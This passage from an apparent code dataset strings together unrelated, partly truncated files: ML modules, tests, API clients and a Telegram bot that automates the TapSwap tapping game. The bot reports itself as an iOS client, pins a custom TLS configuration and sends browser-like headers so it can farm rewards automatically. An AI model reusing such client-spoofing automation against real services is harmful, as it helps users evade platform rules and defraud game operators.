set(expr.edges) == {\"a\", \"b\", \"l\", \"j\", \"j_\", \"i_\"}\n    assert expr == (\n        tg.Function(\"D_0f\", [\"a\", \"b\", \"i_\"], (x, \"i\"), (y, \"k\")).rename({\"j\": \"j_0\"})\n        @ tg.Copy([\"j\", \"j_\", \"j_0\"])\n    )\n\n\ndef test_f_1_1_nested():\n    x = tg.Variable(\"x\", [\"i\"])\n    g = F.Function(\"g\", [\"j\"], (x, \"i\"))\n    f = F.Function(\"f\", [\"k\"], (g, \"j\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"k\", \"i_\"}\n    expected = tg.Function(\"D_0f\", [\"k\", \"j_\"], (g, \"j\")) @ tg.Function(\n        \"D_0g\", [\"j_\", \"i_\"], (x, \"i\"), orig_edges_out=[\"j\", \"i_\"]\n    )\n    assert expr == expected\n\n\ndef test_f_2_1_nested():\n    x = tg.Variable(\"x\", [\"i\"])\n    g = F.Function(\"g\", [\"j\", \"k\"], (x, \"i\"))\n    f = F.Function(\"f\", [\"l\"], (g, \"j\", \"k\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"l",
    "from typing import List\nfrom fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse\nfrom pydantic import BaseModel\n\n\nimport instructor\nimport openai\n\napp = FastAPI()\nclient = instructor.from_openai(openai.OpenAI(), model=\"gpt-4-turbo-preview\")\n\n\nclass Property(BaseModel):\n    name: str\n    value: str\n\n\nclass User(BaseModel):\n    name: str\n    age: int\n    properties: List[Property]\n\n\n@app.post(\"/v1/extract_user\", response_model=User)\ndef extract_user(text: str):\n    user = client.chat.completions.create(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n    return user\n\n\n@app.post(\"/v1/extract_user_stream\")\ndef extract_user_stream(text: str):\n    user_stream = client.chat.completions.create_partial(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n\n    def stream():\n        for partial_user in user_stream:\n            yield f\"data: {partial_user.model_dump_json()}\\n\\n\"\n\n    return StreamingResponse(stream(), media_type=\"text/event-stream\")\n",
    "import asyncio\nfrom telethon.sync import TelegramClient\nfrom telethon.sync import functions, types, events\nfrom threading import Thread\n\nimport json, requests, urllib, time, aiocron, random, ssl, psutil\n\nimport sys\n\n# -----------\nwith open('config.json') as f:\n    data = json.load(f)\n    api_id = data['api_id']\n    api_hash = data['api_hash']\n    admin = data['admin']\n    auto_upgrade = data['auto_upgrade']\n    max_charge_level = data['max_charge_level']\n    max_energy_level = data['max_energy_level']\n    max_tap_level = data['max_tap_level']\n\ndb = {\n    'click': 'on'\n}\n\nVERSION = \"1.4\"\nSTART_TIME = time.time()\n\nclient = TelegramClient('bot', api_id, api_hash, device_model=f\"TapSwap Clicker V{VERSION}\")\nclient.start()\nclient_id = client.get_me(True).user_id\n\n\nprint(\"Client is Ready ;)\")\n\nclient.send_message('tapswap_bot', f'/start r_{admin}')\n\n\n# -----------\n\nclass BypassTLSv1_3(requests.adapters.HTTPAdapter):\n    SUPPORTED_CIPHERS = [\n        \"ECDHE-ECDSA-AES128-GCM-SHA256\", \"ECDHE-RSA-AES128-GCM-SHA256\",\n        \"ECDHE-ECDSA-AES256-GCM-SHA384\", \"ECDHE-RSA-AES256-GCM-SHA384\",\n        \"ECDHE-ECDSA-CHACHA20-POLY1305\", \"ECDHE-RSA-CHACHA20-POLY1305\",\n        \"ECDHE-RSA-AES128-SHA\", \"ECDHE-RSA-AES256-SHA\",\n        \"AES128-GCM-SHA256\", \"AES256-GCM-SHA384\", \"AES128-SHA\", \"AES256-SHA\", \"DES-CBC3-SHA\",\n        \"TLS_AES_128_GCM_SHA256\", \"TLS_AES_256_GCM_SHA384\", \"TLS_CHACHA20_POLY1305_SHA256\",\n        \"TLS_AES_128_CCM_SHA256\", \"TLS_AES_256_CCM_8_SHA256\"\n    ]\n\n    def __init__(self, *args, **kwargs):\n        self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        self.ssl_context.set_ciphers(':'.join(BypassTLSv1_3.SUPPORTED_CIPHERS))\n        self.ssl_context.set_ecdh_curve(\"prime256v1\")\n        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3\n        self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3\n        super().__init__(*args, **kwargs)\n\n    def init_poolmanager(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().init_poolmanager(*args, **kwargs)\n\n    def proxy_manager_for(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().proxy_manager_for(*args, **kwargs)\n\n\ndef getUrlsync():\n    return client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\nasync def getUrl():\n    return await client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\ndef authToken(url):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"x-cv\": \"1\",\n        \"X-App\": \"tapswap_server\"\n    }\n    payload = {\n        \"init_data\": urllib.parse.unquote(url).split('tgWebAppData=')[1].split('&tgWebAppVersion')[0],\n        \"referrer\":\"\"\n    }\n    response = requests.post('https://api.tapswap.ai/api/account/login', headers=headers, data=json.dumps(payload)).json()\n    \n    if auto_upgrade:\n        try:\n            Thread(target=complete_missions, args=(response, response['access_token'],)).start()\n        except:\n            pass\n        try:\n            check_update(response, response['access_token'])\n        except Exception as e:\n            print(e)\n    return response['access_token']\n\n\n\ndef complete_missions(response, auth: str):\n    missions = response['conf']['missions']\n    try:\n        completed_missions = response['account']['missions']['completed']\n    except:\n        completed_missions = []\n    xmissions = []\n    mission_items = []\n\n    for i, mission in enumerate(missions):\n        if f\"M{i}\" in completed_missions:\n            continue\n        xmissions.append(f\"M{i}\")\n        join_mission(f\"M{i}\", auth)\n        \n        for y, item in enumerate(mission['items']):\n            if item['type'] in ['x', 'discord', 'website', 'tg']:\n                mission_items.append([f\"M{i}\", y])\n                finish_mission_item(f\"M{i}\", y, auth)\n        \n    time.sleep(random.randint(30, 36))\n    \n    for i, y in mission_items:\n        finish_mission_item(i, y, auth)\n    \n    for mission_id in xmissions:\n        finish_mission(mission_id, auth)\n        time.sleep(2)\n        claim_reward(auth, mission_id)\n            \ndef join_mission(mission:str, auth:str):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"sam",
    "# Copyright 2020 The HuggingFace Datasets Authors and the current dataset script contributor.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# NOTE: This is an exact copy of\n# https://github.com/huggingface/datasets/blob/3804442bb7cfcb9d52044d92688115cfdc69c2da/datasets/head_qa/head_qa.py\n# with the exception of the `image` feature. This is to avoid adding `Pillow`\n# as a dependency.\n\"\"\"HEAD-QA: A Healthcare Dataset for Complex Reasoning.\"\"\"\n\n\nimport json\nimport os\n\nimport datasets\n\n\n_CITATION = \"\"\"\\\n@inproceedings{vilares-gomez-rodriguez-2019-head,\n    title = \"{HEAD}-{QA}: A Healthcare Dataset for Complex Reasoning\",\n    author = \"Vilares, David  and\n      G{\\'o}mez-Rodr{\\'i}guez, Carlos\",\n    booktitle = \"Proceedings of the 57th Annual Meeting of the Association for Computational Linguistics\",\n    month = jul,\n    year = \"2019\",\n    address = \"Florence, Italy\",\n    publisher = \"Association for Computational Linguistics\",\n    url = \"https://www.aclweb.org/anthology/P19-1092\",\n    doi = \"10.18653/v1/P19-1092\",\n    pages = \"960--966\",\n    abstract = \"We present HEAD-QA, a multi-choice question answering testbed to encourage research on complex reasoning. The questions come from exams to access a specialized position in the Spanish healthcare system, and are challenging even for highly specialized humans. We then consider monolingual (Spanish) and cross-lingual (to English) experiments with information retrieval and neural techniques. We show that: (i) HEAD-QA challenges current methods, and (ii) the results lag well behind human performance, demonstrating its usefulness as a benchmark for future work.\",\n}\n\"\"\"\n\n_DESCRIPTION = \"\"\"\\\nHEAD-QA is a multi-choice HEAlthcare Dataset. The questions come from exams to access a specialized position in the\nSpanish healthcare system, and are challenging even for highly specialized humans. They are designed by the Ministerio\nde Sanidad, Consumo y Bienestar Social.\nThe dataset contains questions about the following topics: medicine, nursing, psychology, chemistry, pharmacology and biology.\n\"\"\"\n\n_HOMEPAGE = \"https://aghie.github.io/head-qa/\"\n\n_LICENSE = \"MIT License\"\n\n_URL = \"https://drive.google.com/uc?export=download&confirm=t&id=1a_95N5zQQoUCq8IBNVZgziHbeM-QxG2t\"\n\n_DIRS = {\"es\": \"HEAD\", \"en\": \"HEAD_EN\"}\n\n\nclass HeadQA(datasets.GeneratorBasedBuilder):\n    \"\"\"HEAD-QA: A Healthcare Dataset for Complex Reasoning\"\"\"\n\n    VERSION = datasets.Version(\"1.1.0\")\n\n    BUILDER_CONFIGS = [\n        datasets.BuilderConfig(\n            name=\"es\", version=VERSION, description=\"Spanish HEAD dataset\"\n        ),\n        datasets.BuilderConfig(\n            name=\"en\", version=VERSION, description=\"English HEAD dataset\"\n        ),\n    ]\n\n    DEFAULT_CONFIG_NAME = \"es\"\n\n    def _info(self):\n        return datasets.DatasetInfo(\n            description=_DESCRIPTION,\n            features=datasets.Features(\n                {\n                    \"name\": datasets.Value(\"string\"),\n                    \"year\": datasets.Value(\"string\"),\n                    \"category\": datasets.Value(\"string\"),\n                    \"qid\": datasets.Value(\"int32\"),\n                    \"qtext\": datasets.Value(\"string\"),\n                    \"ra\": datasets.Value(\"int32\"),\n                    \"answers\": [\n                        {\n                            \"aid\": datasets.Value(\"int32\"),\n                            \"atext\": datasets.Value(\"string\"),\n                        }\n                    ],\n                }\n            ),\n            supervised_keys=None,\n            homepage=_HOMEPAGE,\n            license=_LICENSE,\n            citation=_CITATION,\n        )\n\n    def _split_generators(self, dl_manager):\n        \"\"\"Returns SplitGenerators.\"\"\"\n        data_dir = dl_manager.download_and_extract(_URL)\n\n        dir = _DIRS[self.config.name]\n        data_lang_dir = os.path.join(data_dir, dir)\n\n        return [\n            datasets.SplitGenerator(\n                name=datasets.Split.TRAIN,\n                gen_kwargs={\n                    \"data_dir\": data_dir,\n                    \"filepath\": os.path.join(data_lang_dir, f\"train_{dir}.json\"),\n                },\n            ),\n            datasets.SplitGenerator(\n                name=datasets.Split.TEST,\n                gen_kwargs={\n                    \"data_dir\": data_dir,\n                    \"filepath\": os.path.join(data_lang_dir, f\"test_{dir}.json\"),\n                },\n            ),\n            datasets.SplitGenerator(\n                name=datasets.Split.VALIDATION,\n                gen_",
    "import json\n\nfrom fastapi.testclient import TestClient\nfrom lnurl import (\n    LnurlPayActionResponse,\n    LnurlPayResponse,\n)\n\nfrom .main import app_factory\n\napp = app_factory()\ntest_client = TestClient(app)\n\n\ndef test_read_main():\n    response = test_client.get(\"/\")\n    assert response.status_code == 400\n    assert response.json() == {\"status\": \"ERROR\", \"reason\": \"HTTPException \"}\n\n\ndef test_lnurl_get_lud01():\n    response = test_client.get(\"/lnurl\")\n    assert response.status_code == 200\n    assert response.text.startswith(\"<!DOCTYPE html>\")\n    # Some basic checks to ensure config from `test.env` made it through:\n    assert 'href=\"lnurlp:satoshi@127.0.0.1\"' in response.text\n    assert (\n        'href=\"lightning:LNURL1DP68GURN8GHJ7VFJXUHRQT3S9CCJ7MRWW4EXCUP0WDSHGMMNDP5S4SDZXR\"'\n        in response.text\n    )\n    assert (\n        \"nostr:npub10pensatlcfwktnvjjw2dtem38n6rvw8g6fv73h84cuacxn4c28eqyfn34f\"\n        in response.text\n    )\n\n\ndef test_lnurl_pay_request_lud06_happy():\n    response = test_client.get(\"/lnurlp/satoshi\")\n    assert LnurlPayResponse.parse_obj(response.json()) == LnurlPayResponse.parse_obj(\n        dict(\n            callback=\"https://127.0.0.1/lnurlp/satoshi/callback\",\n            # NOTE these are millisat values\n            minSendable=1_000_000,\n            maxSendable=500_000_000,\n            metadata=json.dumps(\n                [\n                    [\"text/plain\", \"Zap satoshi some sats\"],\n                    [\"text/identifier\", \"satoshi@127.0.0.1\"],\n                ]\n            ),\n        )\n    )\n    assert response.status_code == 200\n\n\ndef test_lnurl_pay_request_lud06_unknown_user():\n    response = test_client.get(\"/lnurlp/notsatoshi\")\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": \"Unknown user\",\n    }\n    assert response.status_code == 404\n\n\ndef test_lnurl_pay_request_lud06_bad_user():\n    response = test_client.get(\"/lnurlp/BOBBYTABLES\")\n    # NOTE this error message is less verbose when `DEBUG=False`\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": (\n            \"RequestValidationError 1 validation error for Request\\n\"\n            \"path -> username\\n\"\n            '  string does not match regex \"^[a-z0-9-_\\\\.]+$\" '\n            \"(type=value_error.str.regex; pattern=^[a-z0-9-_\\\\.]+$)\"\n        ),\n    }\n    assert response.status_code == 400\n\n\ndef test_lnurl_pay_request_lud16_happy():\n    response = test_client.get(\"/.well-known/lnurlp/satoshi\")\n    assert LnurlPayResponse.parse_obj(response.json()) == LnurlPayResponse.parse_obj(\n        dict(\n            callback=\"https://127.0.0.1/lnurlp/satoshi/callback\",\n            # NOTE these are millisat values\n            minSendable=1_000_000,\n            maxSendable=500_000_000,\n            metadata=json.dumps(\n                [\n                    [\"text/plain\", \"Zap satoshi some sats\"],\n                    [\"text/identifier\", \"satoshi@127.0.0.1\"],\n                ]\n            ),\n        )\n    )\n    assert response.status_code == 200\n\n\ndef test_lnurl_pay_request_lud16_unknown_user():\n    response = test_client.get(\"/.well-known/lnurlp/notsatoshi\")\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": \"Unknown user\",\n    }\n    assert response.status_code == 404\n\n\ndef test_lnurl_pay_request_lud16_bad_user():\n    response = test_client.get(\"/.well-known/lnurlp/BOBBYTABLES\")\n    # NOTE this error message is less verbose when `DEBUG=False`\n    assert response.json() == {\n        \"status\": \"ERROR\",\n        \"reason\": (\n            \"RequestValidationError 1 validation error for Request\\n\"\n            \"path -> username\\n\"\n            '  string does not match regex \"^[a-z0-9-_\\\\.]+$\" '\n            \"(type=value_error.str.regex; pattern=^[a-z0-9-_\\\\.]+$)\"\n        ),\n    }\n    assert response.status_code == 400\n\n\ndef test_lnurl_pay_request_callback_lud06_happy():\n    # NOTE we need to use a test client context to ensure lifespan\n    # startup/teardown code is run, otherwise `app.state...` may not exist\n    with TestClient(app) as local_client:\n        response = local_client.get(\n            \"/lnurlp/satoshi/callback\",\n            # NOTE the amount here is millisatoshis\n            params=[(\"amount\", 1337 * 1000)],\n        )\n    assert LnurlPayActionResponse.parse_obj(\n        response.json()\n    ) == LnurlPayActionResponse.parse_obj(\n        dict(\n            pr=(\n                \"lntb1u1pnquurmpp5xr83mlrg4d79e5w8nsrq6fksq83kreptr8uvcyy3\"\n                \"0r2fsve9n6fqcqpjsp5ut3l5lvwpwyjcqf508nzdtze65zl2yycm45uee\"\n                \"elktu3phzv2fsq9q7sqqqqqqqqqqqqqqqqqqqsqqqqqysgqdrytddjyar\"\n                \"90p69ctmsd3skjm3z9s395ctsypekzar0wd5xjgja93djyar90p69ctmf\"\n                \"v3jkuarfve5k2u3z9s38xct5daeks6fzt4wsmqz9grzjqwfn3p9278ttz\"\n                \"zpe0e00uhyxhned3j5d9acqak5emwfpflp8z2cnflcdkeu6euv7gsqqqq\"\n                \"lgqqqqqeqqjqvyrulmkm8x58s9vahdm3z7jlj00pgl04xhfd0gjlm0e5e\"\n                \"z7llfg49ra6pl96808deh95ysvmxajhfse4033k2deh58mrgdjj8kz8s6\"\n        ",
    "# programmer_notes = \"\"\"Important Notes:\n# Do not refresh the page ever to check for anything. Only wait. Do not refresh.\n# You are working in a terminal environment.\n# You will do everything using the terminal and only the terminal.\n# If you need to create a new file, do so using the touch command on the terminal.\n# If you need to see files in the current directory, do so using ls.\n# If you need to view a files content, do so using the cat command on the terminal.\n# To enter code into a file, use a single printf command. After the printf command has been completely typed, press enter. Typing the command and pressing enter must be 2 separate steps.\n# Do not open a text editor like vim or nano.\n# If you need to install a new package, use pip install on the terminal.\n# Do not use the same command repeatedly.\n# When you write code into a file, write it once, cat it once, then stop. Do no attempt to write again unless it is wrong.\n# Remember that you need to press Enter after typing a command into the terminal. Only press enter after the command has been completely typed. Typing the command pressing enter must be 2 separate steps.\"\"\"\n\nprogrammer_notes = \"\"\"Important Notes:\nYou are a Programmer who works in a Replit Environment exclusively. If you need to install a package, use the Shell and not the Console.\nDo not refresh the page ever to check for anything. Only wait. Do not refresh. Do not create new files. Write your code in currently open editor window itself. Do not type double quotation marks. If you are asked to type code containing them, use single quotes instead.\"\"\"\n",
    "# *************************************************************************\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# *************************************************************************\n\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nfrom einops import rearrange, repeat\n\n\nclass AttentionBase:\n\n    def __init__(self):\n        self.cur_step = 0\n        self.num_att_layers = -1\n        self.cur_att_layer = 0\n\n    def after_step(self):\n        pass\n\n    def __call__(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        out = self.forward(q, k, v, is_cross, place_in_unet, num_heads, **kwargs)\n        self.cur_att_layer += 1\n        if self.cur_att_layer == self.num_att_layers:\n            self.cur_att_layer = 0\n            self.cur_step += 1\n            # after step\n            self.after_step()\n        return out\n\n    def forward(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        out = F.scaled_dot_product_attention(q, k, v, attn_mask=None, dropout_p=0.0, is_causal=False)\n        out = rearrange(out, 'b h n d -> b n (h d)')\n        return out\n\n    def reset(self):\n        self.cur_step = 0\n        self.cur_att_layer = 0\n\n\nclass MutualSelfAttentionControl(AttentionBase):\n\n    def __init__(self, start_step=4, start_layer=10, layer_idx=None, step_idx=None, total_steps=50, guidance_scale=7.5):\n        \"\"\"\n        Mutual self-attention control for Stable-Diffusion model\n        Args:\n            start_step: the step to start mutual self-attention control\n            start_layer: the layer to start mutual self-attention control\n            layer_idx: list of the layers to apply mutual self-attention control\n            step_idx: list the steps to apply mutual self-attention control\n            total_steps: the total number of steps\n        \"\"\"\n        super().__init__()\n        self.total_steps = total_steps\n        self.start_step = start_step\n        self.start_layer = start_layer\n        self.layer_idx = layer_idx if layer_idx is not None else list(range(start_layer, 16))\n        self.step_idx = step_idx if step_idx is not None else list(range(start_step, total_steps))\n        # store the guidance scale to decide whether there are unconditional branch\n        self.guidance_scale = guidance_scale\n        print(\"step_idx: \", self.step_idx)\n        print(\"layer_idx: \", self.layer_idx)\n\n    def forward(self, q, k, v, is_cross, place_in_unet, num_heads, **kwargs):\n        \"\"\"\n        Attention forward function\n        \"\"\"\n        if is_cross or self.cur_step not in self.step_idx or self.cur_att_layer // 2 not in self.layer_idx:\n            return super().forward(q, k, v, is_cross, place_in_unet, num_heads, **kwargs)\n\n        if self.guidance_scale > 1.0:\n            qu, qc = q[0:2], q[2:4]\n            ku, kc = k[0:2], k[2:4]\n            vu, vc = v[0:2], v[2:4]\n\n            # merge queries of source and target branch into one so we can use torch API\n            qu = torch.cat([qu[0:1], qu[1:2]], dim=2)\n            qc = torch.cat([qc[0:1], qc[1:2]], dim=2)\n\n            out_u = F.scaled_dot_product_attention(qu, ku[0:1], vu[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out_u = torch.cat(out_u.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out_u = rearrange(out_u, 'b h n d -> b n (h d)')\n\n            out_c = F.scaled_dot_product_attention(qc, kc[0:1], vc[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out_c = torch.cat(out_c.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out_c = rearrange(out_c, 'b h n d -> b n (h d)')\n\n            out = torch.cat([out_u, out_c], dim=0)\n        else:\n            q = torch.cat([q[0:1], q[1:2]], dim=2)\n            out = F.scaled_dot_product_attention(q, k[0:1], v[0:1], attn_mask=None, dropout_p=0.0, is_causal=False)\n            out = torch.cat(out.chunk(2, dim=2), dim=0) # split the queries into source and target batch\n            out = rearrange(out, 'b h n d -> b n (h d)')\n        return out\n\n# forward function for default attention processor\n# modified from __call__ function of AttnProcessor in diffusers\ndef override_attn_proc_forward(attn, editor, place_in_unet):\n    def forward(x, encoder_hidden_states=None, attention_mask=None, context=None, mask=None):\n        \"\"\"\n        The attention is similar to the original implementation of LDM CrossAttention class\n        except adding some modifications on the attention\n     ",
    "import pdb\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as nnf\n\n\nclass SpatialTransformer(nn.Module):\n    \"\"\"\n    N-D Spatial Transformer\n    \"\"\"\n\n    def __init__(self, size, mode='bilinear'):\n        super().__init__()\n\n        self.mode = mode\n\n        # create sampling grid\n        vectors = [torch.arange(0, s) for s in size]\n        grids = torch.meshgrid(vectors)\n        grid = torch.stack(grids)\n        grid = torch.unsqueeze(grid, 0)\n        grid = grid.type(torch.FloatTensor)\n\n        # registering the grid as a buffer cleanly moves it to the GPU, but it also\n        # adds it to the state dict. this is annoying since everything in the state dict\n        # is included when saving weights to disk, so the model files are way bigger\n        # than they need to be. so far, there does not appear to be an elegant solution.\n        # see: https://discuss.pytorch.org/t/how-to-register-buffer-without-polluting-state-dict\n        self.register_buffer('grid', grid)\n\n    def forward(self, src, flow):\n        # new locations\n        new_locs = self.grid + flow\n        shape = flow.shape[2:]\n\n        # need to normalize grid values to [-1, 1] for resampler\n        for i in range(len(shape)):\n            new_locs[:, i, ...] = 2 * (new_locs[:, i, ...] / (shape[i] - 1) - 0.5)\n\n        # move channels dim to last position\n        # also not sure why, but the channels need to be reversed\n        if len(shape) == 2:\n            new_locs = new_locs.permute(0, 2, 3, 1)\n            new_locs = new_locs[..., [1, 0]]\n        elif len(shape) == 3:\n            new_locs = new_locs.permute(0, 2, 3, 4, 1)\n            new_locs = new_locs[..., [2, 1, 0]]\n\n        return nnf.grid_sample(src, new_locs, align_corners=True, mode=self.mode)\n\n\nclass VecInt(nn.Module):\n    \"\"\"\n    Integrates a vector field via scaling and squaring.\n    \"\"\"\n\n    def __init__(self, inshape, nsteps):\n        super().__init__()\n\n        assert nsteps >= 0, 'nsteps should be >= 0, found: %d' % nsteps\n        self.nsteps = nsteps\n        self.scale = 1.0 / (2 ** self.nsteps)\n        self.transformer = SpatialTransformer(inshape)\n\n    def forward(self, vec):\n        vec = vec * self.scale\n        for _ in range(self.nsteps):\n            vec = vec + self.transformer(vec, vec)\n        return vec\n\n\nclass ResizeTransform(nn.Module):\n    \"\"\"\n    Resize a transform, which involves resizing the vector field *and* rescaling it.\n    \"\"\"\n\n    def __init__(self, vel_resize, ndims):\n        super().__init__()\n        self.factor = 1.0 / vel_resize\n        self.mode = 'linear'\n        if ndims == 2:\n            self.mode = 'bi' + self.mode\n        elif ndims == 3:\n            self.mode = 'tri' + self.mode\n\n    def forward(self, x):\n        if self.factor < 1:\n            # resize first to save memory\n            x = nnf.interpolate(x, align_corners=True, scale_factor=self.factor, mode=self.mode)\n            x = self.factor * x\n\n        elif self.factor > 1:\n            # multiply first to save memory\n            x = self.factor * x\n            x = nnf.interpolate(x, align_corners=True, scale_factor=self.factor, mode=self.mode)\n\n        # don't do anything if resize is 1\n        return x\n",
    "from typing import TYPE_CHECKING, Union, Dict, List\n\nfrom ibind.base.rest_client import Result\nfrom ibind.support.logs import project_logger\n\nif TYPE_CHECKING:  # pragma: no cover\n    from ibind import IbkrClient\n\n_LOGGER = project_logger(__file__)\n\n\nclass WatchlistMixin():  # pragma: no cover\n    \"\"\"\n    https://ibkrcampus.com/ibkr-api-page/cpapi-v1/#watchlists\n    \"\"\"\n\n    def create_watchlist(\n            self: 'IbkrClient',\n            id: str,\n            name: str,\n            rows: List[Dict[str, Union[str, int]]]\n    ) -> Result:\n        \"\"\"\n        Create a watchlist to monitor a series of contracts.\n\n        Parameters:\n            id (str): Supply a unique identifier to track a given watchlist. Must supply a number.\n            name (str): Supply the human readable name of a given watchlist. Displayed in TWS and Client Portal.\n            rows (List[Dict[str, Union[str, int]]]): Provide details for each contract or blank space in the watchlist. Each object may include:\n                - C (int): Provide the conid, or contract identifier, of the conid to add.\n                - H (str): Can be used to add a blank row between contracts in the watchlist.\n        \"\"\"\n        return self.post('iserver/watchlist', params={'id': id, 'name': name, 'rows': rows})\n\n    def get_all_watchlists(self: 'IbkrClient', sc: str = 'USER_WATCHLIST') -> Result:\n        \"\"\"\n        Retrieve a list of all available watchlists for the account.\n\n        Parameters:\n            SC (str): Optional. Specify the scope of the request. Valid Values: USER_WATCHLIST.\n        \"\"\"\n        return self.get('iserver/watchlist', params={'SC': sc})\n\n    def get_watchlist_information(self: 'IbkrClient', id: str) -> Result:\n        \"\"\"\n        Request the contracts listed in a particular watchlist.\n\n        Parameters:\n            id (str): Set equal to the watchlist ID you would like data for.\n        \"\"\"\n        return self.get('iserver/watchlist', params={'id': id})\n\n    def delete_watchlist(self: 'IbkrClient', id: str) -> Result:\n        \"\"\"\n        Permanently delete a specific watchlist for all platforms.\n\n        Parameters:\n            id (str): Include the watchlist ID you wish to delete.\n        \"\"\"\n        return self.delete('iserver/watchlist', params={'id': id})\n",
    "import pandas as pd\nimport json\nimport random\n\n'''\nThis script provides metric calculation for mmbench_dev with the same accuarcy algo as OpenCompass server\n'''\n\npredictions = json.load(open('mmbench_dev_20230712.json'))\n\nindex2predictions = {}\nfor pred in predictions:\n    index2predictions[pred['index']] = pred['prediction']\n\n\nfrom collections import Counter\n\ndef most_common_elements(lst):\n    counter = Counter(lst)\n    max_count = max(counter.values())\n    most_common = [element for element, count in counter.items() if count == max_count]\n    return random.choice(most_common) # random sample from random choice\n\ndatas = pd.read_csv(\"data/mmbench/mmbench_dev_20230712/mmbench_dev_20230712.tsv\", sep='\\t')\n\nglb_opts = ['A', 'B', 'C', 'D']\nindex2answer = {}\nindex2choices = {}\nindex2rawanswer = {}\nfor idx in range(len(datas)):\n    data = datas.iloc[idx]\n    \n    choices = []\n    for opt in glb_opts:\n        if not pd.isna(data[opt]):\n            choices.append(data[opt])\n    index2choices[data['index']] = choices\n\n    index2answer[data['index']] = glb_opts.index(data['answer'])\n    index2rawanswer[data['index']] = choices[glb_opts.index(data['answer'])]\n\nidentity_indexes = list(set([int(_ % 1e6) for _ in index2predictions.keys()]))\n\ncorrect = 0\ntotal = 0\nfor index in identity_indexes:\n    raw_preds = []\n    raw_answer = []\n    for _ in range(4):\n        cycle_index = int(_ * 1e6 + index)\n        if index2predictions.get(cycle_index, None) is not None:\n            raw_answer = index2rawanswer[cycle_index]\n            raw_pred = index2choices[cycle_index][index2predictions[cycle_index]]\n            raw_preds.append(raw_pred)\n\n    if len(set(raw_preds)) == 1:\n        if raw_preds[0] == raw_answer:\n            correct += 1\n    else:\n        result = most_common_elements(raw_preds)\n        if result == raw_answer:\n            correct += 1\n\n    total += 1\n\nprint(correct, total, correct / total * 100.)\n",
    "import json\nimport os.path\nfrom os import path as osp\n\nimport cv2\nimport numpy as np\nfrom PIL import Image, ImageDraw\nimport torch\nfrom torch.utils import data\nfrom torchvision import transforms\nimport copy\nimport matplotlib.pyplot as plt\nimport argparse\nimport time \nfrom tqdm import tqdm\n\ndef get_opt():\n    parser = argparse.ArgumentParser()\n    # parser.add_argument('--name', type=str, required=True)\n\n    parser.add_argument('-b', '--batch_size', type=int, default=1)\n    parser.add_argument('-j', '--workers', type=int, default=15)\n    parser.add_argument('--load_height', type=int, default=512)\n    parser.add_argument('--load_width', type=int, default=384)\n    parser.add_argument('--shuffle', action='store_true')\n\n    parser.add_argument('--dataset_dir', type=str, default='/data/extern/vition-HD')\n    parser.add_argument('--dataset_mode', type=str, default='train')\n    parser.add_argument('--paired', type=str, default='paired')\n    # parser.add_argument('--dataset_list', type=str, default='test_pairs.txt')\n    parser.add_argument('--dataset_list', type=str, default='train_pairs_1018new.txt')\n    parser.add_argument('--checkpoint_dir', type=str, default='./checkpoints/')\n    parser.add_argument('--save_dir', type=str, default='./results/')\n    parser.add_argument('--semantic_nc', type=int, default=18)\n\n    parser.add_argument('--warp_cloth_list', type=str, default='/data/extern/vition-HD/sample')\n\n    opt = parser.parse_args()\n    return opt\n\ndef show(title, array):\n    plt.title(title)\n    plt.imshow(array)\n    plt.show()\n\ndef remap_image_vitionhd(img):\n    if 